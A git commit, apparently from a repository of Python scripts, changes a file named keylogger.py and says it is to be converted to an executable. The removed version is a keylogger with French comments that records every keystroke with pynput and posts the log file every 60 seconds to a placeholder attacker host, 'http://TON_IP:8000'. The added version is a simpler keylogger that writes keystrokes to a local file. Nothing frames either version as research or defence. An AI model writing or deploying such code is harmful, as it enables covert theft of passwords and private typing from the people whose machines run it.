7a93d1af2a1f183107984ca5864ad50abeeff9f3
eroge-69 <erogexunamed@gmail.com>
2025-07-07 04:34:03 +0700

    Upload keylogger.py via PY to EXE tool

--- python-files/keylogger.py
+++ python-files/keylogger.py
@@ -1,36 +1,15 @@
-import pynput.keyboard
-import threading
-import time
-import requests
+from pynput import keyboard
 
-log_file = "log.txt"
-interval = 60  # temps entre chaque envoi en secondes
-url = "http://TON_IP:8000"  # change TON_IP
-
-# Fonction de logging
-def enregistrer_touche(touche):
-    with open(log_file, "a") as fichier:
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logKey:
         try:
-            fichier.write(touche.char)
+            char = key.char
+            logKey.write(char)
         except:
-            fichier.write(f"[{touche}]")
+            print("Error getting char")
 
-# Fonction d'envoi
-def envoyer_log():
-    while True:
-        try:
-            with open(log_file, "rb") as f:
-                requests.post(url, files={"file": f})
-        except:
-            pass
-        time.sleep(interval)
-
-# Lancer l'écoute du clavier
-listener = pynput.keyboard.Listener(on_press=enregistrer_touche)
-listener.start()
-
-# Lancer l'envoi en thread
-threading.Thread(target=envoyer_log).start()
-
-listener.join()
-
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
